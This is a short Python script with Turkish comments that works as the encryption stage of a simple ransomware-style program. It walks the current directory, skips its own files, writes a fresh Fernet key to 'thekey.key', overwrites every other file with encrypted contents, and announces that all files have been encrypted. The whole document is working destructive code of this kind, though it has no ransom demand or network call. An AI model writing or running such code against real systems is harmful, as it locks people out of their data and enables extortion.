import os

from cryptography.fernet import Fernet 

files = []

for file in os.listdir(): #Geçerli dizindeki dosyalar taranır
    if file  == "encrypt.py" or file == "thekey.key" or file == "decrypt.py": #Eğer dosya "encrypt.py", "thekey.key" veya "decrypt.py" ise döngünün geri kalan kısmı atlanır
        continue
    if os.path.isfile(file): #Eğer dosya gerçek bir dosya ise dosya adı files listesine eklenir
        files.append(file)

print("Şifrelenen veriler: {}".format(files))

key = Fernet.generate_key() #AES128-CBC şifreleme için simetrik anahtar oluşturulur

with open("thekey.key", "wb") as thekey: #simetrik anahtar "thekey.key" isimli dosyaya yazılır
    thekey.write(key)


for file in files: #files listesindeki her file için döngü başlatılır
    with open(file, 'rb') as thefile: #dosya okuma modunda binary olarak açılır ve dosya nesnesi thefile değişkenine atanır
        contents = thefile.read() #dosyanın içeriği okunur ve contents değişkenine atanır
    contents_encrypted = Fernet(key).encrypt(contents) #okunan içerik şifrelenir ve contents_encrypted değişkenine atanır
     #dosya yazma modunda binary olarak açılır ve dosya nesnesi thefile değişkenine atanır
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted) #şifreli içerik dosyaya yazılır

print("BÜTÜN DOSYALARIN ŞİFRELENDİ")